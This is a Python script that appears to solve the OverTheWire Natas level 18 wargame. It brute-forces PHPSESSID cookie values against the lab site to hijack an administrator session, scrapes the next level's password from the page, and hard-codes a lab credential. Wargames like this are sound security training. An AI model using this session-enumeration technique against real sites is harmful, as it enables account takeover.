import requests
import re

def flag(url,username,password):
    site = requests.get(url,auth=(username,password))
    if site.status_code == 401:
        print("Wrong credentials")
        exit()
    print("Brute-Forcing Cookies. Patience...")
    for number in range(0,641):
        cookie = {
                "Cookie":"PHPSESSID="+str(number)
                }
        site = requests.get(url + "index.php",auth=(username,password),headers=cookie)
        if "regular user" in site.text:
            continue
        else:
            flag = re.findall("Password:(.*)</pre>",site.text)
            print("The flag for natas18 is: " + flag[0].strip())
            break

if __name__=="__main__":
    url = "http://natas18.natas.labs.overthewire.org/"
    username = "natas18"
    password = "8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq"
    flag(url,username,password)